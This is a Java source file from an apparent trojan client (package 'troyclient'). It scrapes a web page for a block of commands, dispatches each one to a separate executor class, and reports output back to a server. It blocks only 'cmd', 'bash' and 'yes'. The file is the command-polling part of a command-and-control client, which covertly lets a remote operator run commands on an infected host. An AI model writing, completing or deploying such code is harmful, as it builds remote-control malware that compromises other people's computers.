package ch.lebois.troyclient.main;

import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;

public class CommandReciver {


    private final Sender sender;
    private final WebHandler webHandler;

    public CommandReciver(WebHandler webHandler) {
        this.webHandler = webHandler;
        sender = SystemVariables.SENDER;
    }

    public String[] getWebsiteCommands() {
        return webHandler.getContent().split("id=\"commands\">")[1].split("</pre>")[0].replace("\\r", "").split("\\n");
    }

    public void readCommands() {
        try {
            for (String command : getWebsiteCommands()) {
                switch (command.toLowerCase()) {
                    case "cmd":
                    case "bash":
                    case "yes":
                        sender.send("error", "Command '" + command + "' not allowed");
                        break;
                    case "clear":
                        for (int i = 27; i != 0; i--) {
                            sender.send("commandout", "");
                        }
                        break;
                    default:
                        new CommandList().readCommand(command);
                        break;
                }
            }
        } catch (NullPointerException | IndexOutOfBoundsException e) {
            System.err.println("No connection to Server");
        }
    }
}
